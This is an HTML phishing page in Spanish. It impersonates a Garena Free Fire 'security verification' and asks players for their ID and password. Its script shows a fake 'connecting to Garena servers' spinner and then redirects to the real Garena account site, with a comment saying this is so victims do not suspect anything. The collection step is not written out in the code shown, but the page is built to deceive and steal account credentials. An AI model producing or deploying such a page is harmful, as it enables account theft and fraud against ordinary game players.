<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Verificación de Seguridad</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background-color: #000;
            background-image: linear-gradient(to bottom, #1a1a1a, #000);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .container {
            background: rgba(20, 20, 20, 0.95);
            width: 320px;
            padding: 30px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
            border: 1px solid #ffcc00;
        }
        h2 {
            color: #ffcc00;
            margin-top: 0;
            font-size: 24px;
        }
        p {
            font-size: 14px;
            color: #ccc;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #333;
            border: 1px solid #555;
            color: white;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        input:focus {
            outline: none;
            border-color: #ffcc00;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to right, #ffcc00, #ffaa00);
            border: none;
            color: black;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            margin-top: 15px;
            transition: 0.2s;
        }
        button:hover {
            background: linear-gradient(to right, #ffaa00, #ff8800);
        }
        .hidden {
            display: none;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ffcc00;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Pantalla de Login -->
    <div id="loginBox">
        <h2>🔒 Seguridad FF</h2>
        <p>Ingresa tus datos para desactivar la verificación de seguridad.</p>
        
        <form id="ffForm">
            <input type="text" id="uid" placeholder="ID de Jugador" required autocomplete="off">
            <input type="password" id="pass" placeholder="Contraseña" required autocomplete="off">
            <button type="submit">VERIFICAR AHORA</button>
        </form>
    </div>

    <!-- Pantalla de Carga -->
    <div id="loadingBox" class="hidden">
        <h2>Procesando...</h2>
        <p>Conectando con los servidores de Garena...</p>
        <div class="loader"></div>
    </div>
</div>

<script>
    document.getElementById('ffForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Ocultar formulario y mostrar carga
        document.getElementById('loginBox').classList.add('hidden');
        document.getElementById('loadingBox').classList.remove('hidden');

        // Tiempo de espera simulado (3 segundos)
        setTimeout(function() {
            // Redirigir a la página real para que no sospechen
            window.location.href = "https://account.garena.com"; 
        }, 3000);
    });
</script>

</body>
</html>
